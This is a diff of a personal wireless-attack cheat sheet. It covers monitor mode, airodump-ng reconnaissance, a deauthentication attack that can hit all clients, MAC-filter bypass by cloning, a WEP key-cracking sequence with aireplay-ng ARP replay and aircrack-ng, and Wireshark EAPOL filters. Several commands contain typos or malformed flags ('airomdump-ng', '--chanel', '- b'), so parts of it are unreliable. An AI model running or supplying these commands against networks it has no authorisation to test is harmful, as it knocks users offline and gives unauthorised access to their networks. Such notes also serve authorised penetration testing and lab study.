@@ -1,46 +1,56 @@
-Perform an active scan:  
-# iwlist wlan0 scan
-# iw dev wlan0 scan
+--Perform an active scan-- 
+iwlist wlan0 scan
+iw dev wlan0 scan
 
-Enable monitor mode on an existing interface: 
-# iwconfig wlan0 mode monitor
-# iw dev wlan set monitor none
+--Enable monitor mode on an existing interface--
+iwconfig wlan0 mode monitor
+iw dev wlan set monitor none
 
-Manually set the channel: 
-# iwconfig wlan0 channel 1
-# iw dev wlan0  set channel 1
+--Manually set the channel--
+iwconfig wlan0 channel 1
+iw dev wlan0  set channel 1
 
-Manually enable 802.11n 40-MHz mode:
-# iw dev wlan0 set channel 6 HT40+
-# iw dev wlan0 set channel 6 HT40-
+--Manually enable 802.11n 40-MHz mode:--
+iw dev wlan0 set channel 6 HT40+
+iw dev wlan0 set channel 6 HT40-
 
-Create a monitor mode interface (mac80211 only):
-# i w dev wlan0 interface add mon0 type monitor
+--Create a monitor mode interface (mac80211 only):--
+iw dev wlan0 interface add mon0 type monitor
 
-Deauth attack
-# sudo aireplay-ng --deauth [multiple of 64 attack packets] -a [Target MAC] -c [BSSID MAC] wlan0
->>> Note, ommiting C will broadcast deauth to all clients
+--Deauth attack--
+#as root
+aireplay-ng --deauth [multiple of 64 attack packets] -a [Target MAC] -c [BSSID MAC] wlan0
+#Note, ommiting C will broadcast deauth to all clients
 
-MAC Filtering Bypass
-# sudo ifconfig wlan0 down
-# sudo ifconfig wlan hw ether [CLONED MAC]
-# sudo ifconfig wlan0 up
+--MAC Filtering Bypass--
+ifconfig wlan0 down
+ifconfig wlan hw ether [CLONED MAC]
+ifconfig wlan0 up
 
 
 --airodump prep--
-#airmon-ng
-#airmon-ng start wlan1
+airmon-ng
+airmon-ng start wlan1
 [you may have to run airmon-ng check kill]
-#airmon-ng start wlan1
-#ifconfig  ' to show the wlan#mon port
-# airomdump-ng wlan1mon
-# airodump-ng wlan1mon --essid [ESSID NAME]
+airmon-ng start wlan1
+ifconfig  #to show the wlan#mon port
+airomdump-ng wlan1mon
+airodump-ng wlan1mon --essid [ESSID NAME]
 
-WEP attack
-# sudo airmon-ng start wlan0 [CHANNEL]
-# sudo airodump-ng --chanel [CHANEL] --bssid [MAC ADDR] --write - [FILE NAME] mon0
-# sudo aireplay-ng --arpreplay -h [CLIENT MAC] - b [BSSID MAC] mon0
-# aircrack-ng -b [BSSID MAC] [FILE NAME]
+--Restart Networking--
+service networking restart
+service network-manager restart
+
+--WEP attack--
+airmon-ng start wlan0 [CHANNEL]
+airodump-ng --chanel [CHANEL] --bssid [MAC ADDR] --write - [FILE NAME] mon0
+aireplay-ng --arpreplay -h [CLIENT MAC] - b [BSSID MAC] mon0
+aircrack-ng -b [BSSID MAC] [FILE NAME]
+
+--Wireshark EAP display filter --
+eapol
+--wireshark ssid display filter
+wlan_mgt.ssid == "[SSID]"
 
 
 
